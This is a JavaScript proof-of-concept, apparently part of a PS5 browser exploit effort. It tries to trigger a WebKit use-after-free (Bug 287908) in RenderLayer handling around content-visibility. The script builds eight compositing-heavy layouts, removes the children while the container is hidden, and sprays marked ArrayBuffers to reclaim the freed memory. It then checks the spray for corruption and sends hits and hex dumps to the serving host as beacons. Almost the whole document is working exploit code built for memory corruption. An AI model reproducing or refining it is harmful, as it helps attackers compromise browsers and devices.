// p200 — Bug 287908 precise content-visibility RenderLayer UAF trigger
//
// Previous attempt (p191, 500 iterations) did not crash. Possible reasons:
// 1. Children didn't create compositing layers correctly
// 2. The z-order list traversal doesn't happen on PS5's compositing path
// 3. The timing between removal and compositing traversal is off
//
// This version tries multiple approaches to force the UAF:
// A. Heavy compositing children (3D transforms, filters, backdrop-filter)
// B. Nested stacking contexts with z-index
// C. position:fixed children (force separate compositing layer)
// D. will-change:transform,opacity on every child
// E. CSS transition on content-visibility itself
// F. requestAnimationFrame timing for precise layout/compositing cycle
// G. overflow:scroll with scrollbar layers
// H. CSS contain:strict on container
//
// Beacon prefix: V200-

(function() {
  "use strict";

  var BASE = location.protocol + '//' + location.host;

  function syncB(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V200-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch(e) {}
  }

  syncB('BOOT');

  var hasCV = false;
  try {
    var t = document.createElement('div');
    document.body.appendChild(t);
    t.style.contentVisibility = 'hidden';
    hasCV = (t.style.contentVisibility === 'hidden');
    t.remove();
  } catch(e) {}

  syncB('CV-' + (hasCV ? 'YES' : 'NO'));
  if (!hasCV) { syncB('ABORT'); return; }

  var alive = true;
  var testIndex = 0;
  var SPRAY_SIZE = 256;
  var SPRAY_COUNT = 5000;
  var ROUNDS_PER_TEST = 50;
  var MARKER = 0xDEADF00D;

  function makeSpray() {
    var arr = [];
    for (var i = 0; i < SPRAY_COUNT; i++) {
      var ab = new ArrayBuffer(SPRAY_SIZE);
      var v = new DataView(ab);
      v.setUint32(0, MARKER, true);
      v.setUint32(4, i, true);
      arr.push(ab);
    }
    return arr;
  }

  function checkSpray(arr) {
    var corrupt = 0;
    for (var i = 0; i < arr.length; i++) {
      if (new DataView(arr[i]).getUint32(0, true) !== MARKER) {
        corrupt++;
        if (corrupt === 1) {
          var u8 = new Uint8Array(arr[i]);
          var hex = '';
          for (var j = 0; j < 64; j++) hex += ('0' + u8[j].toString(16)).slice(-2);
          syncB('DUMP-' + hex.substring(0, 60));
        }
      }
    }
    return corrupt;
  }

  // Test configurations — each creates compositing layers differently
  var tests = [
    {
      name: 'A-3DTRANSFORM',
      makeChild: function(i) {
        var d = document.createElement('div');
        d.style.cssText = 'position:absolute;top:' + (i*30) + 'px;left:0;' +
          'width:100px;height:25px;background:red;' +
          'transform:translateZ(' + (i*10) + 'px) rotateY(' + (i*5) + 'deg);' +
          'z-index:' + (i+1) + ';';
        return d;
      },
      childCount: 20
    },
    {
      name: 'B-FILTER',
      makeChild: function(i) {
        var d = document.createElement('div');
        d.style.cssText = 'position:relative;z-index:' + (i+1) + ';' +
          'width:80px;height:20px;background:blue;' +
          'filter:blur(' + (i % 3) + 'px);opacity:0.' + (5 + i % 5) + ';';
        return d;
      },
      childCount: 15
    },
    {
      name: 'C-WILLCHANGE',
      makeChild: function(i) {
        var d = document.createElement('div');
        d.style.cssText = 'position:relative;z-index:' + (i+1) + ';' +
          'width:60px;height:15px;background:green;' +
          'will-change:transform,opacity,filter;';
        var inner = document.createElement('div');
        inner.style.cssText = 'position:absolute;z-index:100;width:30px;height:10px;' +
          'background:yellow;will-change:transform;';
        d.appendChild(inner);
        return d;
      },
      childCount: 25
    },
    {
      name: 'D-FIXED',
      makeChild: function(i) {
        var d = document.createElement('div');
        d.style.cssText = 'position:fixed;top:' + (i * 20 + 100) + 'px;left:100px;' +
          'width:50px;height:15px;background:purple;z-index:' + (i+1) + ';' +
          'transform:translateZ(0);';
        return d;
      },
      childCount: 10
    },
    {
      name: 'E-NESTED',
      makeChild: function(i) {
        var d = document.createElement('div');
        d.style.cssText = 'position:relative;z-index:' + (i+1) + ';' +
          'width:120px;height:30px;contain:strict;' +
          'will-change:transform;';
        for (var j = 0; j < 3; j++) {
          var sub = document.createElement('div');
          sub.style.cssText = 'position:absolute;z-index:' + (j+1) + ';' +
            'width:40px;height:10px;background:orange;' +
            'transform:translateZ(' + (j*5) + 'px);';
          d.appendChild(sub);
        }
        return d;
      },
      childCount: 12
    },
    {
      name: 'F-SCROLL',
      makeChild: function(i) {
        var d = document.createElement('div');
        d.style.cssText = 'position:relative;z-index:' + (i+1) + ';' +
          'width:100px;height:40px;overflow:auto;' +
          'will-change:scroll-position;';
        var tall = document.createElement('div');
        tall.style.cssText = 'height:200px;background:linear-gradient(red,blue);';
        d.appendChild(tall);
        return d;
      },
      childCount: 8
    },
    {
      name: 'G-ANIMATION',
      makeChild: function(i) {
        var d = document.createElement('div');
        d.style.cssText = 'position:relative;z-index:' + (i+1) + ';' +
          'width:60px;height:20px;background:cyan;' +
          'animation:spin 1s linear infinite;';
        return d;
      },
      childCount: 15
    },
    {
      name: 'H-BACKDROP',
      makeChild: function(i) {
        var d = document.createElement('div');
        d.style.cssText = 'position:relative;z-index:' + (i+1) + ';' +
          'width:80px;height:25px;' +
          'backdrop-filter:blur(2px);background:rgba(255,0,0,0.3);';
        return d;
      },
      childCount: 10
    }
  ];

  // Add animation keyframes
  try {
    var styleEl = document.createElement('style');
    styleEl.textContent = '@keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }';
    document.head.appendChild(styleEl);
  } catch(e) {}

  function runTest(test) {
    var name = test.name;
    syncB('TEST-' + name);
    var round = 0;
    var totalCorrupt = 0;

    function nextRound() {
      if (!alive || round >= ROUNDS_PER_TEST) {
        syncB(name + '-DONE-R' + round + '-C' + totalCorrupt);
        testIndex++;
        if (testIndex < tests.length && alive) {
          setTimeout(function() { runTest(tests[testIndex]); }, 100);
        } else {
          syncB('ALL-DONE-C' + totalCorrupt);
        }
        return;
      }
      round++;

      var container = document.createElement('div');
      container.style.cssText = 'position:relative;width:400px;height:500px;' +
        'overflow:hidden;contain:layout style paint;';
      document.body.appendChild(container);

      var children = [];
      for (var i = 0; i < test.childCount; i++) {
        var child = test.makeChild(i);
        container.appendChild(child);
        children.push(child);
      }

      // Force initial layout + compositing
      void container.offsetHeight;
      void container.getBoundingClientRect();

      // Step 1: Set content-visibility to hidden
      container.style.contentVisibility = 'hidden';
      void container.offsetHeight;

      // Step 2: Remove ALL children while hidden
      for (var i = 0; i < children.length; i++) {
        children[i].remove();
      }
      children = null;

      // Step 3: Spray to reclaim freed RenderLayer memory
      var spray = makeSpray();

      // Step 4: Toggle back to visible — this is where the UAF happens
      // Use requestAnimationFrame for precise timing
      requestAnimationFrame(function() {
        try {
          container.style.contentVisibility = 'visible';
          void container.offsetHeight;

          // Force multiple compositing updates
          container.style.transform = 'translateZ(0)';
          void container.offsetHeight;
          container.style.transform = '';
          void container.offsetHeight;

          // Force paint
          container.style.opacity = '0.99';
          void container.offsetHeight;
          container.style.opacity = '1';
          void container.offsetHeight;

          // Try 'auto' as well
          container.style.contentVisibility = 'auto';
          void container.offsetHeight;
        } catch(e) {
          syncB(name + '-CATCH-' + round);
        }

        var corrupt = checkSpray(spray);
        if (corrupt > 0) {
          totalCorrupt += corrupt;
          syncB(name + '-HIT-R' + round + '-N' + corrupt);
        }

        container.remove();
        spray = null;

        if (round % 10 === 0) syncB(name + '-PROG-' + round);

        setTimeout(nextRound, 0);
      });
    }

    nextRound();
  }

  syncB('START');
  runTest(tests[0]);

  setTimeout(function() {
    alive = false;
    syncB('TIMEOUT');
  }, 120000);

})();
